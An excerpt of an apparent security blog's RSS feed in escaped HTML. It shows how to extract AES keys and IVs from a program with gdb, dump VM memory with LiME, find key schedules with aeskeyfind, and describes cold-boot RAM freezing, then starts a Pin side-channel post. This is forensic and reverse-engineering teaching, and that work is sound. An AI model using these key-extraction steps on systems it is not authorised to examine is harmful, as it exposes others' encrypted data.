   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b1f&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;87&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b23&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;91&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;lea&lt;/span&gt;    &lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;,[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;ebp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x14&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
   &lt;span style=&#34;color: #93A1A1&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color: #268BD2&#34;&gt;x08048b26&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;94&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;:&lt;/span&gt;	&lt;span style=&#34;color: #268BD2&#34;&gt;mov&lt;/span&gt;    &lt;span style=&#34;color: #DC322F&#34;&gt;DWORD&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;PTR&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;],&lt;/span&gt;&lt;span style=&#34;color: #B58900&#34;&gt;eax&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;Again we see the arguments pushed to the stack.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;EVP_DecryptInit_ex arguments&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4
5
6
7&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color: #268BD2&#34;&gt;EVP_DecryptInit_ex&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER_CTX&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;ctx,&lt;/span&gt;    &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[esp]&lt;/span&gt;
&lt;span style=&#34;color: #719e07&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;EVP_CIPHER&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;type,&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x4&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;ENGINE&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;impl,&lt;/span&gt;           &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x8&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;key,&lt;/span&gt;     &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #DC322F&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;iv&lt;/span&gt;       &lt;span style=&#34;color: #719e07&#34;&gt;&amp;lt;==&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;[esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;We put a breakpoint at &lt;code&gt;0x08048b06&lt;/code&gt; and re-run the binary. Then we can read key and IV like before:&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;finding key and IV in gdb without debug info&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;1
2
3
4&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;(gdb)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;$esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0x10&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;))&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d71&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt;	 &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;d36a4bf2e6dd9c68&amp;quot;&lt;/span&gt;
&lt;span style=&#34;color: #93A1A1&#34;&gt;(gdb)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;s&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;((&lt;/span&gt;&lt;span style=&#34;color: #DC322F&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color: #719e07&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color: #93A1A1&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;$esp&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color: #2AA198&#34;&gt;0xc&lt;/span&gt; &lt;span style=&#34;color: #93A1A1&#34;&gt;))&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;0x8048d50&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;:&lt;/span&gt;	 &lt;span style=&#34;color: #2AA198&#34;&gt;&amp;quot;ee12c03ceacdfb5d4c0e67c8f5ab3362&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;However, notice the difference in the function name. It is not just called &lt;code&gt;(0xb7ed3a21) EVP_DecryptInit_ex&lt;/code&gt; but &lt;code&gt;(0x08048b06) EVP_DecryptInit_ex@plt&lt;/code&gt;. Addresses are different. Here’s a tip which is not scientific or anything but works for me. If you see an address starting with 0×08 you are in process-land and addresses starting with 0xb are in shared library land. But what is this @plt?
In short, it’s the &lt;code&gt;Procedure Linkage Table&lt;/code&gt;. The compiler does not know where &lt;code&gt;EVP_DecryptInit_ex&lt;/code&gt; points to at runtime so it just puts the function call there (relocation) because it does not know the address of our shared library at runtime. Linker will get this function call and replace it with the correct address for the function (actually this is a lot more complex but PLT and Global Offset Table or GOT need their own article). You can read about GOT/PLT in The &lt;a href=&#34;http://www.linuxjournal.com/article/1060&#34; target=&#34;_blank&#34;&gt;ELF Object File Format by Dissection on Linux Journal&lt;/a&gt; (search for “plt” and read 3 paragraphs including the one with lazy binding).&lt;/p&gt;

&lt;h4 id=&#34;2-6-ios-and-android:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.6 iOS and Android&lt;/h4&gt;

&lt;p&gt;I am not going to go into detail about how we can monitor crypto function calls in iOS and Android as we already have two excellent tools that accomplish this. &lt;code&gt;[redacted internal tool]&lt;/code&gt; is for iOS and &lt;code&gt;[[redacted internal tool]]&lt;/code&gt; is for Android. You can make them hook into crypto function calls and find keys. This is left as an exercise to the reader (meaning I am too lazy). There are also two excellent tutorials by two of my co-workers on how to create custom hooks in iOS and Android &lt;a href=&#34;https://hexplo.it/substrate-hooking-native-code-iosandroid/&#34; target=&#34;_blank&#34;&gt;Substrate - hooking C on Android and iOS part1/2&lt;/a&gt; and &lt;a href=&#34;https://hexplo.it/substrate-android/&#34; target=&#34;_blank&#34;&gt;Substrate - hooking C on Android and iOS part 2/2&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;2-7-defence:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;2.7 Defence?&lt;/h4&gt;

&lt;p&gt;We saw that function calls (library calls) leak information. One defense against this side-channel is to link the binaries statically. This will replicate the library code inside the binary and will hopefully make the binary independent of any shared libraries (better for installation). On the other hand, it will increase code size (and thus binary size).&lt;/p&gt;

&lt;h3 id=&#34;3-0-looking-for-key-in-memory:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;3.0 Looking for Key in Memory&lt;/h3&gt;

&lt;p&gt;But there are ways to defeat that too. This is our small incursion into the lands of Digital Forensics. The keys are going to be on memory. So that’s where we are going to look for them. But how do we find keys in memory. One step is to look for data with high entropy because keys usually look random. But there are many 128-bit (or 256) parts of memory that look random so what do we do?&lt;/p&gt;

&lt;p&gt;Remember the &lt;code&gt;Key Schedule&lt;/code&gt;? It’s the original key, followed by a number of round keys. If we see a 176 byte structure on memory that looks random, that’s probably a key schedule. After finding memories with these characteristics, we can use the relation between the round keys and the original encryption key to determine if the structure is a key schedule.&lt;/p&gt;

&lt;p&gt;There are tools that do this for us and they were mostly created for use in Cold Boot Attacks and digital forensics. Imagine if you have a computer running disk encryption software. These keys may be stored in memory in plaintext. Open it up while running until you have access to the RAM. Get a can of air spray, turn it upside down and spray the RAM with it. It will freeze. Frozen RAM degrade much slower so we will have more time to read it. Read it and then run tools on it to find keys. Because memory may have been degraded, these tools use the relationship between round keys and original key to recover degraded bits. For more information you can read this paper &lt;a href=&#34;https://citp.princeton.edu/research/memory/&#34; target=&#34;_blank&#34;&gt;Lest We Remember: Cold Boot Attacks on Encryption Keys&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;3-1-dumping-memory:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;3.1 Dumping Memory&lt;/h4&gt;

&lt;p&gt;First we need to dump process memory. I know of a couple of different tools. One is &lt;a href=&#34;http://lcamtuf.coredump.cx/soft/memfetch.tgz&#34; target=&#34;_blank&#34;&gt;memfetch&lt;/a&gt; by &lt;code&gt;lcamtuf&lt;/code&gt; (creator of &lt;a href=&#34;http://lcamtuf.coredump.cx/afl/&#34; target=&#34;_blank&#34;&gt;American fuzzy lop fuzzer&lt;/a&gt;). In order to build it in Kali you need some &lt;a href=&#34;http://parsiya.net/blog/2014-11-18-building-memfetch-on-kali/&#34; target=&#34;_blank&#34;&gt;modifications&lt;/a&gt;. Another is &lt;a href=&#34;https://code.google.com/p/shortstop/&#34; target=&#34;_blank&#34;&gt;shortstop&lt;/a&gt; but has not been update for a long time. By using a &lt;code&gt;Loadable Kernel Module (LKM)&lt;/code&gt; named &lt;a href=&#34;https://github.com/504ensicsLabs/LiME&#34; target=&#34;_blank&#34;&gt;LiME&lt;/a&gt; we can make a memory snapshot of the entire machine. And last but not least &lt;a href=&#34;https://github.com/volatilityfoundation/volatility&#34; target=&#34;_blank&#34;&gt;Volatility&lt;/a&gt; (a memory forensics framework). If you are interested the creators of Volatility recently released a book &lt;a href=&#34;http://www.amazon.com/The-Art-Memory-Forensics-Detecting/dp/1118825098&#34; target=&#34;_blank&#34;&gt;The Art of Memory Forensics&lt;/a&gt;. I have not had time to read it but it looks very useful.&lt;/p&gt;

&lt;p&gt;Let’s use LiME in our VM.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;building and using LiME&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;/LiME/src$ make
make -C /lib/modules/3.7-trunk-686-pae/build &lt;span style=&#34;color: #268BD2&#34;&gt;M&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;/root/LiME/src modules
make&lt;span style=&#34;color: #719e07&#34;&gt;[&lt;/span&gt;1&lt;span style=&#34;color: #719e07&#34;&gt;]&lt;/span&gt;: Entering directory &lt;span style=&#34;color: #586E75&#34;&gt;`&lt;/span&gt;/usr/src/linux-headers-3.7-trunk-686-pae&lt;span style=&#34;color: #2AA198&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;  CC [M]  /root/LiME/src/tcp.o&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;  CC [M]  /root/LiME/src/disk.o&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;  CC [M]  /root/LiME/src/main.o&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;  LD [M]  /root/LiME/src/lime.o&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;  Building modules, stage 2.&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;  MODPOST 1 modules&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;  CC      /root/LiME/src/lime.mod.o&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;  LD [M]  /root/LiME/src/lime.ko&lt;/span&gt;
&lt;span style=&#34;color: #2AA198&#34;&gt;make[1]: Leaving directory `/usr/src/linux-headers-3.7-trunk-686-pae&amp;#39;&lt;/span&gt;
strip --strip-unneeded lime.ko
mv lime.ko lime-3.7-trunk-686-pae.ko
/LiME/src$ insmod lime-3.7-trunk-686-pae.ko &lt;span style=&#34;color: #268BD2&#34;&gt;path&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;memorydump.raw &lt;span style=&#34;color: #268BD2&#34;&gt;format&lt;/span&gt;&lt;span style=&#34;color: #719e07&#34;&gt;=&lt;/span&gt;raw
/LiME/src$
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;This dumps Virtual Machine’s memory to &lt;code&gt;memorydump.raw&lt;/code&gt;. Now we need to find keys.&lt;/p&gt;

&lt;h4 id=&#34;3-2-finding-keys:2cbddf826dbc10ef777e4fb8d0b66a21&#34;&gt;3.2 Finding Keys&lt;/h4&gt;

&lt;p&gt;There are different tools that we can use here again. One is from the “Lest We Remember” paper called &lt;code&gt;aeskeyfind&lt;/code&gt;. Another is &lt;a href=&#34;http://www.forensicswiki.org/wiki/Bulk_extractor&#34; target=&#34;_blank&#34;&gt;Bulk extractor&lt;/a&gt; which finds other memory artifacts such as URLs, emails and Credit Card numbers. We will use &lt;code&gt;aeskeyfind&lt;/code&gt;. The &lt;code&gt;v&lt;/code&gt; switch is for verbose mode that prints the key schedule among other information. This is really not recommended in memory forensics because we are running the dump program inside the VM memory and it will alter memory but it is enough for our purposes. Another thing to note is that I was not running our example program while making the memory snapshot but I found encryption keys.&lt;/p&gt;

&lt;p&gt;


    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;keys inside VM memory dump&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;./aeskeyfind -v memorydump.raw 
FOUND POSSIBLE 128-BIT KEY AT BYTE 376ecc30 

KEY: 10b57f8070a27e482fd3713da5303108

EXTENDED KEY: 
10b57f8070a27e482fd3713da5303108
15724f8665d031ce4a0340f3ef3371fb
d4d14059b1017197fb0231641431409f
17d89ba3a6d9ea345ddbdb5049ea9bcf
98cc11983e15fbac63ce20fc2a24bb33
be26d27d803329d1e3fd092dc9d9b21e
ab11a0a02b228971c8df805c01063242
84328cdcaf1005ad67cf85f166c9b7b3
d99be1ef768be442114461b3778dd600
9f6d821ae9e66658f8a207eb8f2fd1eb
bc536b6955b50d31ad170ada2238db31

CONSTRAINTS ON ROWS:
00000000000000000000000000000000
00000000000000000000000000000000
00000000000000000000000000000000
00000000000000000000000000000000
00000000000000000000000000000000
00000000000000000000000000000000
00000000000000000000000000000000
00000000000000000000000000000000
00000000000000000000000000000000
00000000000000000000000000000000
Keyfind progress: 100%
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
  &lt;/div&gt;
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;The 0 constraints mean that no keys were degraded (because we took an on a VM). &lt;strong&gt;I do not know what the encryption key is, it&amp;rsquo;s just in memory of VM&lt;/strong&gt;. If you find out please let me know. In order to find the key for our OpenSSL program this way, we need to stop execution when the key schedule is on memory. This is left as an exercise to the reader (lol).&lt;/p&gt;

&lt;p&gt;This concludes our part one. I initially wanted to write everything in one blog post but it this was already too long. Hopefully I can find a 3rd party app to demonstrate my technique in part 2. As usual if you have any feedback/questions, you know where to find me (side bar &amp;mdash;&amp;gt;).&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Pin Adventures - Chapter 1 - PinSolver Mk1</title>
      <link>http://parsiya.net/blog/2014-12-08-Pin-Adventures---Chapter-1---PinSolver-Mk1/</link>
      <pubDate>Mon, 08 Dec 2014 20:46:59 +0000</pubDate>
      
      <guid>http://parsiya.net/blog/2014-12-08-Pin-Adventures---Chapter-1---PinSolver-Mk1/</guid>
      <description>

&lt;p&gt;While writing the writeups for the &lt;a href=&#34;http://parsiya.net/blog/2014-10-07-my-adventure-with-fireeye-flare-challenge/#ch6&#34; target=&#34;_blank&#34;&gt;Flare On Challenge 6&lt;/a&gt; I came upon &lt;a href=&#34;http://gaasedelen.blogspot.com/2014/09/solving-fireeyes-flare-on-six-via-side.html&#34; target=&#34;_blank&#34;&gt;an alternative solution&lt;/a&gt; by &lt;a href=&#34;https://twitter.com/gaasedelen&#34; target=&#34;_blank&#34;&gt;@gaasedelen&lt;/a&gt; to use the number of executed instructions as a side-channel. Recently during an engagement I used &lt;a href=&#34;https://software.intel.com/en-us/articles/pintool&#34; target=&#34;_blank&#34;&gt;Pintool&lt;/a&gt; to do &lt;code&gt;[redacted]&lt;/code&gt;. Now that I have a bit of time, I decided to use the idea to write such a tool.&lt;/p&gt;

&lt;p&gt;As an example, we will use a C program that checks input for a hardcoded value using &lt;code&gt;strncmp&lt;/code&gt;. We want to see if it&amp;rsquo;s vulnerable to this side-channel (number of executed instructions).&lt;/p&gt;

&lt;p&gt;##My Setup
I will be using a Kali 32-bit VM using VirtualBox. Installing Pin is as simple as extracting the appropriate distribution in a directory and adding it to path.&lt;/p&gt;

&lt;p&gt;###Pintool
Pin is a dynamic binary instrumentation framework by Intel. The default installation contains a good number of examples in &lt;code&gt;/pintool/source/tools/ManualExamples/&lt;/code&gt;. If you look at various tutorials on it, most will use instruction count example in &lt;code&gt;inscount0.cpp&lt;/code&gt;. I will be simplifying it to suit our needs and do &lt;em&gt;some&lt;/em&gt; comments.&lt;/p&gt;

&lt;p&gt;Here is the modified code. Let&amp;rsquo;s name it &lt;code&gt;myins.cpp&lt;/code&gt; and save it in the ManualExamples directory. Apologies for the legal stuff at the start but I&amp;rsquo;d rather keep them than risk the wrath of open source gods.&lt;/p&gt;




    

&lt;figure class=&#34;code&#34;&gt;
  &lt;figcaption&gt;
  	&lt;span&gt;myins.c&lt;/span&gt;
  &lt;/figcaption&gt;
  &lt;div class=&#34;codewrapper&#34;&gt; 
    &lt;table class=&#34;highlighttable&#34;&gt;&lt;tr&gt;&lt;td&gt;&lt;div class=&#34;linenodiv&#34; style=&#34;background-color: #f0f0f0; padding-right: 10px&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt; 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #002B36&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #586E75&#34;&gt;/*BEGIN_LEGAL &lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;Intel Open Source License &lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;Copyright (c) 2002-2014 Intel Corporation. All rights reserved.&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt; &lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;Redistribution and use in source and binary forms, with or without&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;modification, are permitted provided that the following conditions are&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;met:&lt;/span&gt;

&lt;span style=&#34;color: #586E75&#34;&gt;Redistributions of source code must retain the above copyright notice,&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;this list of conditions and the following disclaimer.  Redistributions&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;in binary form must reproduce the above copyright notice, this list of&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;conditions and the following disclaimer in the documentation and/or&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;other materials provided with the distribution.  Neither the name of&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;the Intel Corporation nor the names of its contributors may be used to&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;endorse or promote products derived from this software without&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;specific prior written permission.&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt; &lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;``AS IS&amp;#39;&amp;#39; AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE INTEL OR&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;ITS CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,&lt;/span&gt;
&lt;span style=&#34;color: #586E75&#34;&gt;DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY&lt;/span&gt;
